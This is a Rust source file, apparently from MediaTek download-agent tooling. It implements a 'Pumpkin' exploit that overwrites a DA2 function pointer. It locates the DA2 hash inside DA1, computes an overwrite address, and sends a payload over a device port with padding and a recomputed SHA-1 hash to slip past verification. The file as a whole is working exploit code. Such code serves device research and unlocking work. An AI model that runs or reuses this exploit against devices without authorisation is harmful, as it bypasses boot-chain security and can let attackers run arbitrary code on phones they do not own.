use crate::{err::Error, exploit::Exploit};
use da_protocol::{SimpleRead, SimpleWrite};
use derive_ctor::ctor;
use sha1::{Digest, Sha1};

/// DA2 function pointer overwrite
#[derive(ctor)]
pub struct Pumpkin<'a> {
    da1: &'a [u8],
    da2: &'a [u8],
    payload: &'a [u8],
    da1_base: u32,
}

impl Exploit for Pumpkin<'_> {
    fn run(&self, port: &mut da_protocol::Port) -> crate::Result<()> {
        let mut hasher = Sha1::new();
        hasher.update(&self.da2[..self.da2.len() - 256]);
        let hash = hasher.finalize();

        let offset = (0..self.da1.len())
            .find(|&i| self.da1[i..].starts_with(&hash))
            .ok_or(Error::Custom("da2 hash not found :(".into()))?;

        // + 20 for hash end
        // - 256 for ignored area
        port.write_u32(self.da1_base + offset as u32 + 20 - 256 - self.payload.len() as u32)?;
        port.write_u32(self.payload.len() as u32 + 256)?;
        port.write_u32(self.payload.len() as u32 + 256)?;
        port.read_u8()?; // Always ok

        port.write_all(self.payload)?;

        let mut hasher = Sha1::new();
        hasher.update(self.payload);
        let hash = hasher.finalize();

        port.write_all(&[0; 256 - 20])?;
        port.write_all(&hash)?;
        port.read_u8()?;
        port.read_u8()?;

        Ok(())
    }
}
